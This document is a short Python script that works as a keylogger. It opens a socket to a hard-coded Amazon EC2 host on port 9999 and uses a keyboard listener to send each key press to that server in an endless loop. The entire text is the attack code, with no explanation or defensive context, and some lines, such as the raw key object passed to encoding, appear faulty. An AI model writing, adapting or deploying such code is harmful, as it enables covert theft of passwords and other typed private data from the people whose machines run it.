import socket
import os
import subprocess
from pynput.keyboard import Listener

s = socket.socket()
host = socket.gethostbyname("ec2-18-217-85-9.us-east-2.compute.amazonaws.com")
port = 9999

s.connect( (host, port) )


def send(key):

    s.send( str.encode(key) )

while True:
	
    with Listener(on_press=send) as l:
        l.join("")
